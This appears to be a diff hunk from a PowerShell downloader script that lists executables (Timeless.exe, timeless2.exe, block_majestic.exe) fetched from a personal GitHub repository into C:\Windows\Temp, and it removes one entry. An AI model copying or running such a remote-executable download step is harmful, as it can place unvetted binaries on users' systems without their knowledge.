@@ -30,8 +30,7 @@ $script:bottomY = $Host.UI.RawUI.CursorPosition.Y
 
 $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
-    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless2.exe'; Path = 'C:\Windows\Temp\timeless2.exe' },
-    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless2.exe'; Path = 'C:\Windows\Temp\timeless2.exe' }
 )
 
 function Show-Progress {
